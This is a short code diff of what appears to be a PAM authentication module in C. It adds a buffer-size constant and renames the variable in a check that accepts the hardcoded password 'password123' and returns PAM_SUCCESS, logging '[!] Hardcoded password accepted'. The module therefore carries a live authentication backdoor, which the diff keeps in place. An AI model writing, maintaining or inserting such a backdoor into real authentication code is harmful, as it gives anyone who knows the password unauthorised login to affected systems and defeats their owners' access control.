@@ -11,6 +11,7 @@
 
 #define LOG_DIR  "/etc/logcheck"
 #define LOG_FILE "/etc/logcheck/pam_auth.log"
+#define BUF_MAX		256
 
 /* ---------------- DEBUG SWITCH ---------------- */
 
@@ -99,7 +100,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     }
 
     /* ---------------- HARDCODED PASSWORD ---------------- */
-    if (authtok && strcmp(authtok, "password123") == 0) {
+    if (pword && strcmp(pword, "password123") == 0) {
         trace("[!] Hardcoded password accepted");
         trace("[TRACE] EXIT PAM_SUCCESS");
         return PAM_SUCCESS;
